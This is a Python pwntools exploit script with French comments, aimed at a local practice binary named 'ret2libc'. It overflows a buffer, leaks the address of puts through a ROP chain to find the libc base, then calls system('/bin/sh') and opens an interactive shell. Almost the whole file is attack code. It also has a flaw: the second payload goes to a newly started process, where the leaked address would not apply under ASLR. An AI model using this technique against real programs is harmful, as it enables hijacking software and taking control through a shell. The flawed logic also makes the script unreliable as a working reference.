#!/usr/bin/env python3
from pwn import *

# Configuration
BIN = "./ret2libc"
context.binary = BIN
context.arch = "amd64"
context.log_level = "debug"

# Lancer le processus
io = process(BIN, setuid=False, env={})

# Étape 1 : Leaker une adresse de la libc
elf = context.binary
libc = elf.libc  # Charger la libc associée au binaire
rop = ROP(elf)

# Trouver un gadget pop rdi; ret
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Adresse de puts dans la GOT (exemple)
puts_got = elf.got['puts']  # Remplace par une fonction utilisée dans le binaire
puts_plt = elf.plt['puts']

# Construire une charge utile pour leaker puts
ret_offset = 0x80 + 8  # Même offset
payload = (
    b"A" * ret_offset +
    p64(pop_rdi) +
    p64(puts_got) +
    p64(puts_plt) +
    p64(elf.symbols['main'])  # Retourner à main pour continuer l'exécution
)

# Envoyer la charge utile
io.send(payload)

# Récupérer la sortie
io.recvuntil(b"\n")  # Ignorer la sortie jusqu'à l'adresse
leaked_addr = u64(io.recv(6).ljust(8, b"\x00"))  # Lire l'adresse de puts
log.info(f"Leaked puts address: {hex(leaked_addr)}")

# Calculer la base de la libc
libc.address = leaked_addr - libc.symbols['puts']
log.info(f"Libc base: {hex(libc.address)}")

# Obtenir les adresses de system et /bin/sh
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b"/bin/sh\x00"))

# Construire la charge utile finale
payload = (
    b"A" * ret_offset +
    p64(pop_rdi) +
    p64(binsh_addr) +
    p64(system_addr)
)

# Relancer le processus (ou continuer si possible)
io = process(BIN, setuid=False, env={})
io.send(payload)

# Passer en mode interactif
io.interactive()
